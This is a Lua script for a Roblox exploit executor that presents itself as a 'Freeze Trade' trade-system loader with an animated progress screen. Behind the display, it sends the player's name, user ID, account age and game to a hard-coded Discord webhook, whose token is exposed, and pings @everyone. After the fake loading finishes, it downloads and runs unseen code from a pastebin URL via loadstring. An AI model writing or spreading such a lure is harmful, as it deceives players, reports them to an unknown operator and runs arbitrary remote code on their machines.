-- Combined Discord Webhook + Loading GUI Script
-- Executor script that sends Discord notifications and shows a loading screen

local WEBHOOK_URL = "https://discord.com/api/webhooks/1401297999153594509/FNoThHM5XsZ8NIdFbz8IkL0XJB2Dx_89bH7_klv8iVBqPDNlx7GCOiaZLO6RB4Mgpovd"
local SCRIPT_URL = "https://pastebin.com/raw/qJ4t9TTq"
local LOAD_TIME = 7

-- Services
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

-- Get the correct request function for your executor
local request = http_request or request or syn.request or fluxus.request

-- Function to send initial webhook with player info
local function sendInitialWebhook()
	local success, gameName = pcall(function()
		return game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
	end)
	if not success then gameName = "Unknown Game" end
	local data = {
             ["content"] = "@everyone @here",
		["embeds"] = {{
			["title"] = "🎮 Script Executed",
			["description"] = "Executor script has been run!",
			["color"] = 5763719,
			["fields"] = {
				{
					["name"] = "Player",
					["value"] = LocalPlayer.Name,
					["inline"] = true
				},
				{
					["name"] = "Display Name",
					["value"] = LocalPlayer.DisplayName,
					["inline"] = true
				},
				{
					["name"] = "User ID",
					["value"] = tostring(LocalPlayer.UserId),
					["inline"] = true
				},
				{
					["name"] = "Account Age",
					["value"] = tostring(LocalPlayer.AccountAge) .. " days",
					["inline"] = true
				},
				{
					["name"] = "Game",
					["value"] = gameName,
					["inline"] = false
				}
			},
			["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ"),
			["footer"] = {
				["text"] = "Roblox Executor Webhook"
			}
		}}
	}

	pcall(function()
		request({
			Url = WEBHOOK_URL,
			Method = "POST",
			Headers = {["Content-Type"] = "application/json"},
			Body = HttpService:JSONEncode(data)
		})
	end)
end

-- Function to send final webhook when loading is complete
local function sendCompleteWebhook()
	local data = {
             ["content"] = "@everyone",
		["embeds"] = {{
			["title"] = "✅ Freeze Trade Loaded",
			["description"] = "Trade system successfully loaded!",
			["color"] = 7930354,
			["fields"] = {
				{
					["name"] = "Player",
					["value"] = LocalPlayer.Name,
					["inline"] = true
				}
			},
			["footer"] = {
				["text"] = "Freeze Trade Loader"
			},
			["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
		}}
	}

	pcall(function()
		request({
			Url = WEBHOOK_URL,
			Method = "POST",
			Headers = {["Content-Type"] = "application/json"},
			Body = HttpService:JSONEncode(data)
		})
	end)
end

-- Send initial webhook immediately

sendInitialWebhook()


-- Create Loading GUI
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "LoadingGui"
ScreenGui.ResetOnSpawn = false
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.Parent = PlayerGui

-- Background blur overlay

-- Main Card
local Card = Instance.new("Frame")
Card.Size = UDim2.new(0, 360, 0, 220)
Card.Position = UDim2.new(0.5, -180, 0.5, -110)
Card.BackgroundColor3 = Color3.fromRGB(15, 15, 30)
Card.BorderSizePixel = 0
Card.Parent = ScreenGui

local CardCorner = Instance.new("UICorner")
CardCorner.CornerRadius = UDim.new(0, 16)
CardCorner.Parent = Card

local CardStroke = Instance.new("UIStroke")
CardStroke.Color = Color3.fromRGB(80, 60, 200)
CardStroke.Thickness = 2
CardStroke.Parent = Card

-- Glow effect
local Glow = Instance.new("ImageLabel")
Glow.Size = UDim2.new(1, 60, 1, 60)
Glow.Position = UDim2.new(0, -30, 0, -30)
Glow.BackgroundTransparency = 1
Glow.Image = "rbxassetid://5028857084"
Glow.ImageColor3 = Color3.fromRGB(80, 60, 200)
Glow.ImageTransparency = 0.7
Glow.ZIndex = 0
Glow.Parent = Card

-- Title Label
local TitleLabel = Instance.new("TextLabel")
TitleLabel.Size = UDim2.new(1, 0, 0, 40)
TitleLabel.Position = UDim2.new(0, 0, 0, 20)
TitleLabel.BackgroundTransparency = 1
TitleLabel.Text = "⚠  FREEZE TRADE"
TitleLabel.Font = Enum.Font.GothamBold
TitleLabel.TextSize = 22
TitleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TitleLabel.Parent = Card

-- Subtitle
local SubLabel = Instance.new("TextLabel")
SubLabel.Size = UDim2.new(1, -40, 0, 25)
SubLabel.Position = UDim2.new(0, 20, 0, 60)
SubLabel.BackgroundTransparency = 1
SubLabel.Text = "Loading trade system, please wait..."
SubLabel.Font = Enum.Font.Gotham
SubLabel.TextSize = 13
SubLabel.TextColor3 = Color3.fromRGB(180, 170, 220)
SubLabel.TextXAlignment = Enum.TextXAlignment.Left
SubLabel.Parent = Card

-- Progress Bar Background
local BarBg = Instance.new("Frame")
BarBg.Size = UDim2.new(1, -40, 0, 10)
BarBg.Position = UDim2.new(0, 20, 0, 110)
BarBg.BackgroundColor3 = Color3.fromRGB(35, 30, 60)
BarBg.BorderSizePixel = 0
BarBg.Parent = Card

local BarBgCorner = Instance.new("UICorner")
BarBgCorner.CornerRadius = UDim.new(1, 0)
BarBgCorner.Parent = BarBg

-- Progress Bar Fill
local BarFill = Instance.new("Frame")
BarFill.Size = UDim2.new(0, 0, 1, 0)
BarFill.BackgroundColor3 = Color3.fromRGB(100, 70, 255)
BarFill.BorderSizePixel = 0
BarFill.Parent = BarBg

local BarFillCorner = Instance.new("UICorner")
BarFillCorner.CornerRadius = UDim.new(1, 0)
BarFillCorner.Parent = BarFill

-- Gradient on bar
local BarGradient = Instance.new("UIGradient")
BarGradient.Color = ColorSequence.new({
	ColorSequenceKeypoint.new(0, Color3.fromRGB(80, 50, 220)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(160, 100, 255)),
})
BarGradient.Parent = BarFill

-- Percent Label
local PercentLabel = Instance.new("TextLabel")
PercentLabel.Size = UDim2.new(1, 0, 0, 20)
PercentLabel.Position = UDim2.new(0, 0, 0, 128)
PercentLabel.BackgroundTransparency = 1
PercentLabel.Text = "0%"
PercentLabel.Font = Enum.Font.GothamBold
PercentLabel.TextSize = 13
PercentLabel.TextColor3 = Color3.fromRGB(160, 140, 255)
PercentLabel.Parent = Card

-- Dots animation label
local DotsLabel = Instance.new("TextLabel")
DotsLabel.Size = UDim2.new(1, -40, 0, 20)
DotsLabel.Position = UDim2.new(0, 20, 0, 155)
DotsLabel.BackgroundTransparency = 1
DotsLabel.Text = "● ○ ○"
DotsLabel.Font = Enum.Font.Gotham
DotsLabel.TextSize = 14
DotsLabel.TextColor3 = Color3.fromRGB(100, 80, 200)
DotsLabel.TextXAlignment = Enum.TextXAlignment.Left
DotsLabel.Parent = Card

-- Result Label (hidden at start)
local ResultLabel = Instance.new("TextLabel")
ResultLabel.Size = UDim2.new(1, -40, 0, 40)
ResultLabel.Position = UDim2.new(0, 20, 0, 155)
ResultLabel.BackgroundTransparency = 1
ResultLabel.Text = ""
ResultLabel.Font = Enum.Font.GothamBold
ResultLabel.TextSize = 14
ResultLabel.TextColor3 = Color3.fromRGB(100, 255, 160)
ResultLabel.TextWrapped = true
ResultLabel.TextXAlignment = Enum.TextXAlignment.Left
ResultLabel.Visible = false
ResultLabel.Parent = Card

-- Animate dots
local dotFrames = {"● ○ ○", "● ● ○", "● ● ●", "○ ● ●", "○ ○ ●"}
local dotIndex = 1

-- === MAIN LOADING SEQUENCE ===
task.spawn(function()
	local startTime = tick()
	local dotTimer = 0

	-- Animate loading bar over LOAD_TIME seconds
	while true do
		local elapsed = tick() - startTime
		local progress = math.clamp(elapsed / LOAD_TIME, 0, 1)

		-- Update bar
		BarFill.Size = UDim2.new(progress, 0, 1, 0)
		PercentLabel.Text = math.floor(progress * 100) .. "%"

		-- Animate dots
		dotTimer += task.wait(0.05)
		if dotTimer >= 0.4 then
			dotTimer = 0
			dotIndex = dotIndex % #dotFrames + 1
			DotsLabel.Text = dotFrames[dotIndex]
		end

		if progress >= 1 then break end
	end

	-- Done! Show result
	DotsLabel.Visible = false
	ResultLabel.Text = "✔  Trade System Loaded! Welcome, " .. LocalPlayer.Name .. "!"
	ResultLabel.Visible = true
	PercentLabel.Text = "100%"

	-- Pulse the card border green
	TweenService:Create(CardStroke, TweenInfo.new(0.4), {
		Color = Color3.fromRGB(60, 220, 120)
	}):Play()

	-- Send completion webhook

	sendCompleteWebhook()


	-- Wait a bit then fade out
	task.wait(2.5)

	local cardFade = TweenService:Create(Card, TweenInfo.new(0.8), {
		BackgroundTransparency = 1
	})
	cardFade:Play()

	task.wait(0.9)
	ScreenGui:Destroy()

	-- Execute your script after GUI is gone
	print("Loading main script...")
	local ok, err = pcall(function()
		loadstring(game:HttpGet(SCRIPT_URL))()
	end)

	if not ok then
		warn("[LoadingGUI] loadstring failed: " .. tostring(err))
	else
		print("✅ Main script loaded successfully!")
	end
end)
